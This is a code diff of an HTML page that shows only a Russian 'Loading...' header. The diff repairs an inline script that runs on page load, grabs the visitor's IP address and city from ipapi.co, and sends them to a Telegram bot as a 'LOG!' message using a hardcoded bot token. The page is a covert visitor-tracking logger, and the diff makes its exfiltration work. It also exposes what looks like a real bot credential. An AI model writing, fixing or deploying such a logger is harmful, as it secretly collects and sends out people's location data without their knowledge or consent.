@@ -2,7 +2,7 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
-    <h1 id="status">Загрузка... (v12.0)</h1>
+    <h1 id="status">Загрузка... (v13.0)</h1>
     <script>
         async function run() {
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
@@ -10,14 +10,12 @@
             const status = document.getElementById('status');
 
             try {
-                // 1. Получаем IP (ИСПРАВЛЕНО: добавлен /json/)
-                const res = await fetch('https://ipapi.co');
+                const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 
                 const text = encodeURIComponent(`🚀 ЛОГ!\nIP: ${data.ip}\nГород: ${data.city}`);
 
-                // 2. Отправляем в Telegram (ИСПРАВЛЕНО: добавлен /bot и $)
-                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${text}`;
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}`;
                 
                 const tgRes = await fetch(url);
                 const result = await tgRes.json();
